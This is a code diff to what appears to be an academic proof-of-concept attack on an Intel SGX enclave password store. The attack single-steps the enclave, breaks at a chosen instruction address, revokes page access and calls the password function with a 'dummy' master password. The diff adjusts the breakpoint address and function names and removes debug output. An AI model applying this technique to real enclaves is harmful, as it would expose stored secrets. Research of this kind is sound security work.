@@ -87,7 +87,7 @@ void aep_cb_func(void)
     info("^^ enclave RIP=%#llx", erip);
 
     
-    if(erip == 0x3330){ // logout between line 38 and 39
+    if(erip == 0x32c9){ // logout between line 38 and 39
         info("testreach");
         sgx_step_do_trap = 0;
         single_stepping = 0;
@@ -316,13 +316,9 @@ void* victim_thread(void* arg) {
     };
 
     
-    ecall_get_passwords2(eidarg, masterpw, &output);
+    ecall_get_passwords(eidarg, masterpw, &output);
     
 
-    int rv = 1;
-    ecall_get_debug(eidarg, &rv);
-    printf("threadAfinished\n");
-    printf("debug%d\n", rv);
 
 
     for (int i = 0; i < output.array_len; ++i) {
@@ -379,7 +375,7 @@ void* attacker_thread(void* arg) {
         printf("access rights revoked on sha\n");
     }
 
-    ecall_get_passwords2(eidarg, "dummy", &output);
+    ecall_get_passwords(eidarg, "dummy", &output);
 
     printf("testjegens");
     for (int i = 0; i < output.array_len; ++i) {
@@ -416,7 +412,7 @@ int main( int argc, char **argv )
         .passwords = {password1, password2, password3, password4}
     };
 
-    ecall_get_passwords2(eid, "dummy", &output);
+    ecall_get_passwords(eid, "dummy", &output);
 
     printf("EXPLOIT\n");
     for (int i = 0; i < output.array_len; ++i) {
